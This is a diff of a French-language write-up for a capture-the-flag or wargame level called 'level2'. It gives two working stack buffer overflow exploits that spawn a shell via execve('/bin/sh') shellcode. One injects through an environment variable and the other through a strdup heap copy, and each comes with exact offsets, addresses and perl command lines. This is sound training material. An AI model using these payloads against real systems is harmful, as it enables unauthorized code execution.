@@ -1,2 +1,29 @@
-perl -e 'print "\x90"x15 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "A"x20 . "\x4a\x85\x04\x08" . "\0"x12 . scalar reverse pack "H*", "bffff6ec"'
+Plusieurs méthodes ici, mais chacune devra utiliser un shellcode vu qu'il n'y a aucun call a system/exec etc dans le code. 
+La difficulté de l'exo est qu'on ne peut pas écraser la sauvegarde eip avec une adresse
+commençant par 0xb, sinon le programme exit.
+On a donc peut de choix.
+
+----- Méthode 1 - La version compliquée -------
+
+Laisser p() return vers le main et écraser la sauvegarde d'eip du main.
+Cela nécessite de recopier la sauvegarde d'ebp telle quelle lorsqu'on overflow
+sinon le ret du main va crash.
+Vu que le main va directement ret et donc pop eip, on a pas besoin d'aller overflow le main, eip sera la prochaine valeur qu'on met sur la stack.
+C'est plus simple en exportant le shellcode dans l'env qu'en l'écrivant de le buffer car cela permet de mettre plein de NOP dans l'env et car le buffer est altéré après le gets(), ce qui augmente fortement le risque d'erreur.
 export SHELLCODE=$(perl -e 'print "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
+Pour trouver l'adresse du shellcode dans le programme, on peut faire lors de l'exécution `x/s *((char**)environ)`. Vu que j'exporte avec "SHELLCODE=", il faut rajouter 10 à l'adresse. Lors de l'injection je rajouterai 100 car j'ai mis 200 NOP, je vise le milieu pour avoir le plus de marge possible.
+Voici donc les étapes de cette injection:
+_On envoie du padding jusqu'à arriver à la save d'ebp, soit 76.
+_On réecrit la save d'ebp telle quelle, soit 0xbffff738
+_On réecrit la save d'eip vers l'instruction ret du main pour gagner du temps, soit 0x0804854b
+_On écrit l'adresse du milieu des NOP avant le shellcode dans l'env, soit 0xbffff888
+Cela nous done en gardant stdin ouvert
+cat <(perl -e 'print "A"x76 . "\x38\xf7\xff\xbf" . "\x4b\x85\x04\x08" . "\x88\xf8\xff\xbf"') - | ./level2
+
+----- Méthode 2 - La version simple -------
+
+Notre buffer va être copié dans la heap avec le strdup. Cette copie aura pour adresse de départ 0x804a008, on peut donc rediriger le retour de p() vers cet endroit.
+Il suffit de mettre notre shellcode dans le buffer avec autant de NOP que possible pour qu'il ne soit pas écrasé par les instructions suivantes.
+Cela nous laisse de quoi mettre 36 NOP. On met ensuite le shellcode, puis 16 'A' pour overflow jusqu'à la sauvegarde d'eip et enfin l'adresse du strdup
+Cela nous done en gardant stdin ouvert
+cat <(perl -e 'print "\x90"x36 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x16 . "\x08\xa0\x04\x08"') - | ./level2
